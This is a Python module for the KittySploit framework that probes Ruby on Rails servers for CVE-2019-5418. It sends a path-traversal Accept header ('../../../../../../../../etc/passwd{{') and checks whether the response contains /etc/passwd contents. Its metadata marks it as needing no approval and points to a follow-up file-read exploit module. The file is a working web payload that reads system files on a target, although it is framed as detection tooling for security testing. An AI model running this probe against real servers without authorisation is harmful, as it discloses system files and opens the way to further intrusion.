#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Rails File Content Disclosure via Accept header (CVE-2019-5418)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ruby on Rails - Accept Header LFI Detection (CVE-2019-5418)',
        'description': (
            'Detects CVE-2019-5418 by sending Accept: ../../../../../../../../etc/passwd{{ '
            'and looking for passwd contents in the response.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2019', 'rails', 'lfi', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'auxiliary/admin/http/rails_cve_2019_5418_file_read',
                ],
            },
        },
        'references': [
            'https://weblog.rubyonrails.org/2019/3/13/Rails-4-2-5-1-5-1-6-2-have-been-released/',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-5418',
        ],
        'cve': 'CVE-2019-5418',
    }

    path = OptString('/', 'Path that triggers a Rails render/template response', required=False)

    def run(self):
        path = str(self.path or '/')
        if not path.startswith('/'):
            path = '/' + path
        accept = '../../../../../../../../etc/passwd{{'
        r = self.http_request(
            method='GET',
            path=path,
            headers={'Accept': accept},
            allow_redirects=False,
        )
        if not r:
            return False
        if re.search(r'root:.*:0:0:', r.text or ''):
            self.set_info(
                severity='high',
                reason='Rails Accept-header LFI (CVE-2019-5418)',
                path=path,
            )
            return True
        return False
